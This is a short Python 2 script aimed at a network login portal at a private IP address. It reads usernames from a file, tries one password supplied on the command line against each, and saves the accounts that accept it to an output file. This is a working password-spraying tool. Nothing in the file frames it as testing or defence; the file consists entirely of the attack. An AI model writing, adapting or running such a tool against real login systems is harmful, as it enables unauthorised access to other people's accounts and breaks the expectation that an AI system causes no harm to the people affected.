#!/usr/bin/python
from urllib import urlencode
from urllib2 import urlopen
from sys import argv
# samplespace="aabbccddeeffgghhiijjkkllmmnnooppqqrrssttuuvvwwxxyyzz11223344556677889900"
# a=0
# b=0
# c=0

# For periodic checking of login status
# SLEEP_TIME = 200

BASE_URL = "http://172.16.68.6:8090/login.xml"


def send_request(request_type, *arg):
    if request_type == 'login':
        params = urlencode(
            {'mode': 191, 'username': arg[0], 'password': arg[1]})
    elif request_type == 'logout':
        print("Initiating logout request..")
        params = urlencode({'mode': 193, 'username': arg[0]})

    response = urlopen(BASE_URL, params)
    return response.read()


def main():
    p = argv[1]
    fo = open("idsw.txt", "w")
    with open('user.txt') as fob:
        for line in fob:
            line = line[:-1]
            data = send_request("login", line, p)
            if not "could not" in data:
                fo.write(line+" "+p+"\n")
                print(line + " found for given password..")
    fo.close()

if __name__ == "__main__":
    main()